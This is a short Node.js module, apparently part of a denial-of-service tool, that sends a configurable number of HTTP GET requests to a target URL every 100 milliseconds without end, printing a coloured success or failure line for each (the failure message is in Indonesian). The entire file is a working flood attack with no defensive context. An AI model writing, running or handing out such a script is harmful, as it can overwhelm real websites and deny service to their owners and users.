const axios = require('axios');
const chalk = require('chalk');

module.exports = function(target, threads) {
  setInterval(() => {
    for (let i = 0; i < threads; i++) {
      axios.get(target)
        .then(() => console.log(chalk.green(`[✓] GET => ${target}`)))
        .catch(() => console.log(chalk.red(`[x] Gagal GET`)));
    }
  }, 100);
};